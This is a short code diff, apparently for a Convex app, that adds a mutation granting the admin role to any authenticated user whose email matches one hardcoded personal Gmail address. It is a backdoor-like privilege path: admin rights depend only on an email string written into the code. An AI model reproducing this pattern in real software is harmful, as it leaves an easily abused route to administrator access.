@@ -42,6 +42,21 @@ export const current = query({
   },
 });
 
+export const checkAndPromoteAdmin = mutation({
+  args: {},
+  handler: async (ctx: any) => {
+    const userId = await getAuthUserId(ctx);
+    if (!userId) return null;
+    const user = await ctx.db.get(userId);
+    if (!user) return null;
+    if (user.email?.toLowerCase() === "madhav.internship2024@gmail.com" && user.role !== "admin") {
+      await ctx.db.patch(userId, { role: "admin" });
+      return { ...user, role: "admin" };
+    }
+    return user;
+  },
+});
+
 // Update user profile
 export const updateProfile = mutation({
   args: {
